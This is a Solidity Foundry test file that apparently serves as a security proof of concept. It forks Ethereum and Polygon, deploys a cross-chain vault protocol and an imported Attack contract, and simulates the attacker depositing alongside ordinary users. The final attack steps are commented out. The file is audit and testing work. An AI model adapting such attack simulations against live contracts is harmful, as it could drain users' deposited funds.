// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

// Contracts
import {Attack} from "contracts/attack/Attack.sol";
import "contracts/types/socketTypes.sol";
import "contracts/types/lzTypes.sol";

// Test Utils
import {MockERC20} from "./mocks/MockERC20.sol";
import "./utils/BaseSetup.sol";

contract AttackTest is BaseSetup {
    Attack internal attackETH;
    Attack internal attackPOLY;

    address internal alice = address(0x1);
    address internal bob = address(0x2);
    address internal carol = address(0x3);

    /// @dev reference for chain ids https://layerzero.gitbook.io/docs/technical-reference/mainnet/supported-chain-ids
    uint16 constant ETH = 101;
    uint16 constant POLY = 109;

    address constant ETH_lzEndpoint =
        0x66A71Dcef29A0fFBDBE3c6a460a3B5BC225Cd675;
    address constant POLY_lzEndpoint =
        0x3c2269811836af69497E5F486A85D7316753cf62;

    string ETHEREUM_RPC_URL = vm.envString("ETHEREUM_RPC_URL");
    string POLYGON_RPC_URL = vm.envString("POLYGON_RPC_URL");

    function setUp() public override {
        super.setUp();

        /// @dev Call deploy protocol with intended src and dst chains for simulation
        _deployProtocol(
            ETHEREUM_RPC_URL,
            POLYGON_RPC_URL,
            ETH_lzEndpoint,
            POLY_lzEndpoint,
            ETH,
            POLY
        );

        /// @dev deploy attacking contract on src and dst chain
        address payable ethSuperRouter = payable(
            getContract(ETH, "SuperRouter")
        );

        address payable polyStateHandler = payable(
            getContract(POLY, "StateHandler")
        );

        address payable polySuperDestination = payable(
            getContract(POLY, "SuperDestination")
        );

        address polyDAI = getContract(POLY, "DAI");

        address polyDAIVault = getContract(POLY, "DAIVault");

        vm.selectFork(FORKS[ETH]);
        vm.startPrank(deployer);

        attackETH = new Attack(
            ethSuperRouter,
            polyStateHandler,
            polySuperDestination,
            polyDAI,
            polyDAIVault
        );

        MockERC20 ethDAI = MockERC20(super.getContract(ETH, "DAI"));

        ethDAI.transfer(address(attackETH), milionTokensE18 / 100);

        vm.selectFork(FORKS[POLY]);

        attackPOLY = new Attack(
            ethSuperRouter,
            polyStateHandler,
            polySuperDestination,
            polyDAI,
            polyDAIVault
        );

        vm.stopPrank();
    }

    /*///////////////////////////////////////////////////////////////
                        Unit tests: Same address deployment
    //////////////////////////////////////////////////////////////*/

    function test_attack_contract_same_address() public {
        assertEq(address(attackETH), address(attackPOLY));
    }

    /*///////////////////////////////////////////////////////////////
                        Unit tests: Attack
    //////////////////////////////////////////////////////////////*/

    /// @dev This is a test of an end to end possibçe attack. Testing individual parts (unit tests) can be taken from here
    function test_attack() public {
        uint256 victimVault = 1; // should correspond to DAI vault
        uint256 amountsToDeposit = 1000;
        uint256 ETH_PAYLOAD_ID;
        uint256 POLY_PAYLOAD_ID;
        address underlyingSrcToken = getContract(ETH, "DAI");
        address payable fromSrc = payable(getContract(ETH, "SuperRouter"));
        address payable toDst = payable(getContract(POLY, "SuperDestination"));

        /// @dev Create liqRequest and stateReq for a couple users to deposit in target vault
        (
            StateReq memory stateReq,
            LiqRequest memory liqReq
        ) = _buildDepositCallData(
                fromSrc,
                toDst,
                underlyingSrcToken,
                victimVault,
                amountsToDeposit,
                1 ether,
                ETH,
                POLY
            );
        MockERC20 POLY_DAI = MockERC20(getContract(POLY, "DAI"));
        vm.selectFork(FORKS[POLY]);
        assertEq(POLY_DAI.balanceOf(getContract(POLY, "SuperDestination")), 0);

        /// @dev fund the vault with 10000 DAI
        for (uint256 i = 0; i < users.length; i++) {
            _depositToVaultMultiple(
                DepositMultipleArgs(
                    underlyingSrcToken,
                    fromSrc,
                    toDst,
                    stateReq,
                    liqReq,
                    amountsToDeposit,
                    i,
                    ETH,
                    POLY,
                    POLY_lzEndpoint
                )
            );
        }

        vm.selectFork(FORKS[POLY]);
        assertEq(POLY_DAI.balanceOf(toDst), amountsToDeposit * users.length);

        /// @dev Update state on src and dst and process payload on dst
        /// @notice this will mint to the users the super positions
        for (uint256 i = 0; i < users.length; i++) {
            unchecked {
                POLY_PAYLOAD_ID++;
            }
            _updateState(POLY_PAYLOAD_ID, amountsToDeposit, POLY);

            vm.recordLogs();
            _processPayload(POLY_PAYLOAD_ID, POLY);

            Vm.Log[] memory logs = vm.getRecordedLogs();
            LayerZeroHelper(getContract(POLY, "LayerZeroHelper"))
                .helpWithEstimates(
                    ETH_lzEndpoint,
                    1000000, /// @dev This is the gas value to send - value needs to be tested and probably be lower
                    FORKS[ETH],
                    logs
                );

            unchecked {
                ETH_PAYLOAD_ID++;
            }

            _processPayload(ETH_PAYLOAD_ID, ETH);

            vm.selectFork(FORKS[ETH]);
            assertEq(
                SuperRouter(fromSrc).balanceOf(users[i], 1),
                amountsToDeposit
            );
        }

        address vaultMock = getContract(POLY, "DAIVault");
        vm.selectFork(FORKS[POLY]);
        assertEq(
            VaultMock(vaultMock).balanceOf(toDst),
            amountsToDeposit * users.length
        );

        /// @dev Step 1 - deposit from the source attacker contract
        /// @dev Attack starts from the attacking contract which is the 'user'
        /// @dev Notice no parameters are changed here from the same kind of requests the other users did
        StateReq[] memory stateReqs = new StateReq[](1);
        LiqRequest[] memory liqReqs = new LiqRequest[](1);

        stateReqs[0] = stateReq;
        liqReqs[0] = liqReq;

        vm.selectFork(FORKS[ETH]);
        vm.prank(deployer);
        attackETH.depositIntoRouter{value: 2 ether}(liqReqs, stateReqs);

        POLY_PAYLOAD_ID++;
        _updateState(POLY_PAYLOAD_ID, amountsToDeposit, POLY);

        /*
        _processPayload(POLY_PAYLOAD_ID, POLY);

        Vm.Log[] memory logs = vm.getRecordedLogs();
        LayerZeroHelper(getContract(POLY, "LayerZeroHelper")).helpWithEstimates(
                ETH_lzEndpoint,
                1000000, /// @dev This is the gas value to send - value needs to be tested and probably be lower
                FORKS[ETH],
                logs
            );

        ETH_PAYLOAD_ID++;
        _processPayload(ETH_PAYLOAD_ID, ETH);

        assertEq(
            SuperRouter(fromSrc).balanceOf(address(attackETH), 1),
            amountsToDeposit
        );
        */
    }
}
